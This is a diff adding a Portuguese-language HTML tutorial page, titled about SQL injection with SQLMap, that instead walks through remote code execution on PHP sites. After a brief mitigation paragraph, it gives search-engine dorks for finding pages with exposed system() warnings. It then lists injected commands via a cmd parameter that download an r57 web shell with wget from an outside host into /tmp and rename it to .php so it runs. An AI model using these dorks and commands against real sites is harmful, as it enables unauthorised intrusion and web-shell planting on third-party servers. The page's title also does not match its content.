@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Técnicas Avançadas: Identificando Vulnerabilidades de Injeção SQL em Sites através do SQLMap</title>
+<link rel="stylesheet" href="css/style.css">
+
+</head>
+<body>
+
+<div class="container">
+    <h1>Execução de código remoto (RCE)</h1>
+
+    <p>A execução de código remoto (RCE) é uma grave vulnerabilidade de segurança que permite que invasores executem comandos arbitrários em sistemas remotos, geralmente sem autenticação. Isso pode ser explorado através de vulnerabilidades de software, injeção de código, upload de arquivos maliciosos e exploração de serviços e protocolos. Os impactos podem incluir roubo de dados, instalação de malware e modificação ou exclusão de informações. Para mitigar esse risco, é essencial manter o software atualizado, validar entradas de usuário, implementar firewalls, controlar o acesso e monitorar atividades suspeitas.</p>
+<p>Ao utilizar as consultas <pre>"inurl:faq.php & intext:"Warning: system() [function.system]" e "ext:php intext:"Warning: system() [function.system]"</pre>, encontramos uma página que apresenta uma vulnerabilidade relacionada à função system() em arquivos PHP.</p>
+
+<p>Ao examinar a página, notamos que ela solicita um link no formato .txt para execução do shell, porém, para que o shell seja executado corretamente, ele deve estar em formato .php.</p>
+
+<p>Felizmente, encontramos um shell disponível em formato de texto neste link: http://www.c99php.com/shell/r57.txt.</p>
+
+<p>Para contornar essa questão, modificamos a URL para /faq.php?cmd= e adicionamos o comando para mudar o diretório para /tmp e realizar o download do shell através do comando wget:</p>
+
+<pre>/faq.php?cmd= cd /tmp;wget http://www.c99php.com/shell/r57.txt</pre>
+
+<p>Assumindo que o download foi bem-sucedido, verificamos se o arquivo r57.txt foi corretamente armazenado no diretório /tmp com o comando:</p>
+
+<pre>/faq.php?cmd=cd /tmp;ls -la r57.txt</pre>
+
+<p>Uma vez confirmado o upload bem-sucedido, renomeamos o arquivo de r57.txt para check.php para garantir que seja reconhecido como um script PHP:</p>
+
+<pre>/faq.php?cmd=cd /tmp;mv r57.txt check.php</pre>
+
+<p>Dessa forma, conseguimos executar o shell em PHP, tornando-o acessível e funcional na página vulnerável. Este procedimento exemplifica o funcionamento da exploração da vulnerabilidade através da carga do web shell.</p>
+
+</div>
+
+</body>
+</html>
